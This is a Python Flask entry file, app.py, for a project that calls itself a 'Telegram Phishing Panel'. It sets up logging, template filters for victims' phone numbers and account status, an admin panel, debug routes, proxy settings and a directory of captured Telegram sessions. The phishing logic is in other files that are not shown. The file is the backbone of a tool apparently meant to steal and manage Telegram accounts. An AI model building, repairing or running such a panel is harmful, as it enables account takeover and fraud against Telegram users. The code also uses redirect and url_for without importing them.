#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
app.py - Главный файл приложения Telegram Phishing Panel
Версия: 3.1 - Исправлены проблемы с API
"""

from flask import Flask, jsonify, request, session
from datetime import datetime, timedelta
import logging
import os
import sys

# Добавляем текущую директорию в путь для импортов
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Импорт конфигурации
from config import Config

# Импорт маршрутов
try:
    from admin import admin_bp
    from main import main_bp
    print("✓ Маршруты успешно импортированы из admin.py и main.py")
except ImportError as e:
    print(f"✗ ОШИБКА: Не удалось импортировать маршруты: {e}")
    print("  Текущая директория:", os.getcwd())
    print("  Файлы в директории:")
    for file in os.listdir('.'):
        if file.endswith('.py'):
            print(f"    - {file}")
    sys.exit(1)

# Настройка логирования
log_formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Создаем папку для логов, если её нет
os.makedirs(Config.LOGS_DIR, exist_ok=True)

# Хендлер для файла
file_handler = logging.FileHandler(
    os.path.join(Config.LOGS_DIR, 'app.log'),
    encoding='utf-8'
)
file_handler.setFormatter(log_formatter)

# Хендлер для консоли
console_handler = logging.StreamHandler()
console_handler.setFormatter(log_formatter)

# Настройка корневого логгера
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
root_logger.addHandler(file_handler)
root_logger.addHandler(console_handler)

# Создаем логгер для приложения
logger = logging.getLogger(__name__)

# Создание Flask приложения
app = Flask(
    __name__,
    template_folder='templates',
    static_folder='static',
    static_url_path='/static'
)

# Загрузка конфигурации
app.config.from_object(Config)
app.secret_key = Config.SECRET_KEY
app.permanent_session_lifetime = timedelta(hours=2)

# ============================================
# ПОЛЬЗОВАТЕЛЬСКИЕ ФИЛЬТРЫ ДЛЯ ШАБЛОНОВ JINJA2
# ============================================

@app.template_filter('timestamp_to_date')
def timestamp_to_date(timestamp):
    """Преобразует timestamp в читаемый формат даты."""
    if timestamp is None:
        return "Н/Д"
    
    try:
        if isinstance(timestamp, (int, float)):
            ts = float(timestamp)
        elif isinstance(timestamp, str):
            if timestamp.replace('.', '', 1).isdigit():
                ts = float(timestamp)
            else:
                return timestamp
        else:
            return str(timestamp)
        
        dt = datetime.fromtimestamp(ts)
        return dt.strftime('%d.%m.%Y %H:%M:%S')
        
    except (ValueError, TypeError, OSError) as e:
        logger.error(f"Ошибка преобразования timestamp '{timestamp}': {e}")
        return str(timestamp)

@app.template_filter('format_number')
def format_number(value):
    """Форматирует число с разделителями тысяч."""
    try:
        return f"{int(value):,}".replace(",", " ")
    except (ValueError, TypeError):
        return value

@app.template_filter('truncate')
def truncate(text, length=50):
    """Обрезает текст до указанной длины."""
    if not text or len(text) <= length:
        return text
    return text[:length] + "..."

@app.template_filter('phone_format')
def phone_format(phone):
    """Форматирует номер телефона в читаемый вид."""
    if not phone:
        return phone
    
    cleaned = ''.join(filter(str.isdigit, str(phone)))
    
    if len(cleaned) == 12:
        return f"+{cleaned[0:3]} {cleaned[3:5]} {cleaned[5:8]} {cleaned[8:10]} {cleaned[10:12]}"
    elif len(cleaned) == 11:
        return f"+{cleaned[0:2]} {cleaned[2:4]} {cleaned[4:7]} {cleaned[7:9]} {cleaned[9:11]}"
    elif len(cleaned) == 10:
        return f"+38 {cleaned[0:2]} {cleaned[2:5]} {cleaned[5:7]} {cleaned[7:9]}"
    else:
        return phone

@app.template_filter('status_color')
def status_color(status):
    """Возвращает CSS класс для статуса."""
    colors = {
        'success': 'text-green-500 bg-green-500/20',
        'working': 'text-green-500 bg-green-500/20',
        'dead': 'text-red-500 bg-red-500/20',
        'failed': 'text-red-500 bg-red-500/20',
        'pending': 'text-yellow-500 bg-yellow-500/20',
        'active': 'text-green-500 bg-green-500/20',
        'inactive': 'text-gray-500 bg-gray-500/20',
        'error': 'text-red-500 bg-red-500/20',
        'warning': 'text-orange-500 bg-orange-500/20',
        'checking': 'text-yellow-500 bg-yellow-500/20'
    }
    return colors.get(str(status).lower(), 'text-gray-500 bg-gray-500/20')

@app.template_filter('file_size')
def file_size(size):
    """Форматирует размер файла в читаемый вид."""
    try:
        size = float(size)
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} TB"
    except (ValueError, TypeError):
        return str(size)

# ============================================
# КОНТЕКСТНЫЕ ПРОЦЕССОРЫ
# ============================================

@app.context_processor
def utility_processor():
    """Добавляет полезные функции во все шаблоны."""
    return {
        'now': datetime.now,
        'range': range,
        'len': len,
        'str': str,
        'int': int,
        'float': float
    }

# ============================================
# ОБРАБОТЧИКИ ОШИБОК
# ============================================

@app.errorhandler(404)
def not_found_error(error):
    """Обработчик 404 ошибки."""
    logger.warning(f"404 ошибка: {request.path}")
    
    # Проверяем, это API запрос или страница
    if request.path.startswith('/api/'):
        return jsonify({
            'status': 'error',
            'message': 'API endpoint not found',
            'path': request.path
        }), 404
    else:
        return "Страница не найдена", 404

@app.errorhandler(500)
def internal_error(error):
    """Обработчик 500 ошибки."""
    logger.error(f"500 ошибка: {error}")
    if request.path.startswith('/api/'):
        return jsonify({
            'status': 'error',
            'message': 'Внутренняя ошибка сервера'
        }), 500
    return "Внутренняя ошибка сервера", 500

@app.errorhandler(403)
def forbidden_error(error):
    """Обработчик 403 ошибки."""
    logger.warning(f"403 ошибка: {request.path}")
    if request.path.startswith('/api/'):
        return jsonify({
            'status': 'error',
            'message': 'Доступ запрещен'
        }), 403
    return "Доступ запрещен", 403

@app.errorhandler(401)
def unauthorized_error(error):
    """Обработчик 401 ошибки."""
    logger.warning(f"401 ошибка: {request.path}")
    if request.path.startswith('/api/'):
        return jsonify({
            'status': 'error',
            'message': 'Требуется авторизация'
        }), 401
    return redirect(url_for('admin.login'))

# ============================================
# РЕГИСТРАЦИЯ BLUEPRINTS
# ============================================

# Регистрируем blueprint для основных маршрутов
app.register_blueprint(main_bp)
logger.info("✓ Зарегистрирован main_bp из main.py с URL префиксом: /")

# Регистрируем blueprint для админ-панели
app.register_blueprint(admin_bp)
logger.info("✓ Зарегистрирован admin_bp из admin.py с URL префиксом: /admin")

# ============================================
# ДОПОЛНИТЕЛЬНЫЕ МАРШРУТЫ
# ============================================

@app.route('/')
def index_redirect():
    """Редирект на главную страницу."""
    return redirect(url_for('main.index'))

@app.route('/health')
def health():
    """Эндпоинт для проверки здоровья приложения."""
    # Проверяем наличие необходимых файлов
    admin_exists = os.path.exists('admin.py')
    main_exists = os.path.exists('main.py')
    config_exists = os.path.exists('config.py')
    stats_db_exists = os.path.exists('stats_db.py')
    
    # Проверяем доступность БД
    db_status = 'unknown'
    try:
        from stats_db import stats_db
        if stats_db:
            db_status = 'ok'
    except:
        db_status = 'error'
    
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.now().isoformat(),
        'version': '3.1',
        'files': {
            'admin.py': admin_exists,
            'main.py': main_exists,
            'config.py': config_exists,
            'stats_db.py': stats_db_exists
        },
        'database': db_status,
        'directories': {
            'sessions': os.path.exists(Config.SESSIONS_DIR),
            'logs': os.path.exists(Config.LOGS_DIR),
            'templates': os.path.exists('templates')
        }
    })

@app.route('/debug/routes')
def debug_routes():
    """Отладочная информация о маршрутах."""
    routes = []
    for rule in app.url_map.iter_rules():
        routes.append({
            'endpoint': rule.endpoint,
            'methods': list(rule.methods),
            'path': str(rule)
        })
    return jsonify({'routes': routes})

@app.route('/debug/info')
def debug_info():
    """Отладочная информация о приложении."""
    # Проверяем сессию админа
    is_admin = session.get('admin', False)
    
    if not is_admin:
        return jsonify({'error': 'Unauthorized'}), 401
    
    # Собираем информацию о файлах
    py_files = []
    for file in os.listdir('.'):
        if file.endswith('.py'):
            py_files.append({
                'name': file,
                'size': os.path.getsize(file),
                'modified': datetime.fromtimestamp(os.path.getmtime(file)).isoformat()
            })
    
    return jsonify({
        'app_name': app.name,
        'debug': app.debug,
        'environment': os.getenv('FLASK_ENV', 'production'),
        'filters': list(app.jinja_env.filters.keys()),
        'blueprints': list(app.blueprints.keys()),
        'python_files': py_files,
        'config': {
            'api_id_configured': bool(Config.API_ID),
            'api_hash_configured': bool(Config.API_HASH),
            'admin_username': Config.ADMIN_USERNAME,
            'admin_password_configured': bool(Config.ADMIN_PASSWORD),
            'sessions_dir': Config.SESSIONS_DIR,
            'sessions_dir_exists': os.path.exists(Config.SESSIONS_DIR),
            'logs_dir': Config.LOGS_DIR,
            'logs_dir_exists': os.path.exists(Config.LOGS_DIR),
            'proxy_enabled': Config.PROXY_ENABLED
        }
    })

# ============================================
# ЗАПУСК ПРИЛОЖЕНИЯ
# ============================================

if __name__ == '__main__':
    print("\n" + "=" * 70)
    print("🚀 ЗАПУСК TELEGRAM PHISHING PANEL v3.1")
    print("=" * 70)
    
    # Проверка наличия необходимых директорий
    print("\n📁 Проверка директорий:")
    os.makedirs(Config.SESSIONS_DIR, exist_ok=True)
    os.makedirs(Config.LOGS_DIR, exist_ok=True)
    print(f"  ✓ Директория сессий: {Config.SESSIONS_DIR}")
    print(f"  ✓ Директория логов: {Config.LOGS_DIR}")
    print(f"  ✓ Директория шаблонов: {'templates/'}")
    
    # Проверка наличия основных файлов
    print("\n📄 Проверка файлов:")
    required_files = ['admin.py', 'main.py', 'config.py', 'stats_db.py']
    for file in required_files:
        if os.path.exists(file):
            print(f"  ✓ {file}")
        else:
            print(f"  ✗ {file} (ОТСУТСТВУЕТ)")
    
    # Проверка наличия API ключей
    print("\n🔑 Проверка конфигурации:")
    if Config.API_ID and Config.API_HASH:
        print(f"  ✓ API ID: {Config.API_ID}")
        print(f"  ✓ API HASH: настроен")
    else:
        print(f"  ✗ API ID или API HASH не настроены в .env файле!")
        print("    Получите ключи на https://my.telegram.org")
    
    # Проверка пароля админа
    if Config.ADMIN_PASSWORD:
        if Config.ADMIN_PASSWORD == 'StrongPassword123!':
            print("  ⚠ ВНИМАНИЕ: Используется стандартный пароль администратора!")
            print("    Рекомендуется изменить пароль в .env файле")
        else:
            print(f"  ✓ ADMIN_USERNAME: {Config.ADMIN_USERNAME}")
            print(f"  ✓ ADMIN_PASSWORD: настроен")
    else:
        print(f"  ✗ ADMIN_PASSWORD не настроен в .env файле!")
    
    # Проверка прокси
    if Config.PROXY_ENABLED:
        print(f"  ✓ PROXY: включен ({Config.PROXY_TYPE})")
    else:
        print(f"  • PROXY: отключен")
    
    # Проверка маршрутов
    print("\n🌐 Доступные маршруты:")
    print("  • Главная: /")
    print("  • Админ-панель: /admin/")
    print("  • API прокси: /admin/api/proxies")
    print("  • Health check: /health")
    print("  • Debug routes: /debug/routes")
    
    print("\n" + "=" * 70)
    print("✅ Приложение готово к запуску!")
    print("=" * 70)
    print("\n🌐 Адреса:")
    print("  • Главная страница: http://localhost:5000")
    print("  • Админ-панель: http://localhost:5000/admin/login")
    print("  • Health check: http://localhost:5000/health")
    print("  • Debug routes: http://localhost:5000/debug/routes")
    print("\n📝 Логи:")
    print(f"  • Файл логов: {os.path.join(Config.LOGS_DIR, 'app.log')}")
    print("  • Консоль: цветной вывод")
    print("\n" + "=" * 70)
    
    # Запускаем Flask приложение
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=True,
        threaded=True
    )